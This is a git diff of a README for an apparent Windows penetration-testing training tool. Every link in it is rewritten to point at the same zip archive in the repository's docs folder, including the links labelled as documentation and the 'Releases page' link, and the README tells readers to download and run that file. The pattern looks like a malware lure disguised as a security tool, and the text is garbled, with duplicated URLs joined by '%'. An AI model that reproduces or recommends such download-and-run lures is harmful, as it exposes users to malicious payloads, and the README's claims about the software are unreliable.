@@ -1,7 +1,7 @@
 # 🛡️ Simula-o_Ataque_PTES_Windows - Learn Windows Security Testing
 
 ## 📥 Download Now
-[![Download Simula-o_Ataque_PTES_Windows](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip%https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip)](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip)
+[![Download Simula-o_Ataque_PTES_Windows](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip%https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip)](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip)
 
 ---
 
@@ -24,11 +24,11 @@ This guide will help you download and run the software quickly. Follow each step
    - 500 MB of free disk space
 
 2. **Visit the Releases Page:**
-   To download the software, visit the Releases page here: [Download Link](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip).
+   To download the software, visit the Releases page here: [Download Link](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip).
 
 3. **Download the Application:**
    On the Releases page, locate the latest version. Click on the file that fits your system:
-   - For Windows 10/11: Look for a file named something like `https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip`.
+   - For Windows 10/11: Look for a file named something like `https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip`.
    - For Windows Server: Choose the corresponding file.
 
 4. **Run the Downloaded File:**
@@ -86,12 +86,12 @@ If you encounter any issues, please raise your concerns in the Issues section of
 ## 🔗 Additional Resources
 
 For more information about penetration testing and how to use this software effectively, consider checking these links:
-- [Understanding PTES](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip)
-- [Native Windows Tools Overview](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip)
+- [Understanding PTES](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip)
+- [Native Windows Tools Overview](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip)
   
 ### Download Again
 
-If you need to download the software, visit this link: [Download Link](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/raw/refs/heads/main/docs/Ataque-Simula-PTE-Windows-o-sulfaguanidine.zip).
+If you need to download the software, visit this link: [Download Link](https://raw.githubusercontent.com/Cupcake137/Simula-o_Ataque_PTES_Windows/main/docs/Windows-o-Ataque-Simula-PTE-v1.0-alpha.3.zip).
 
 ---
 
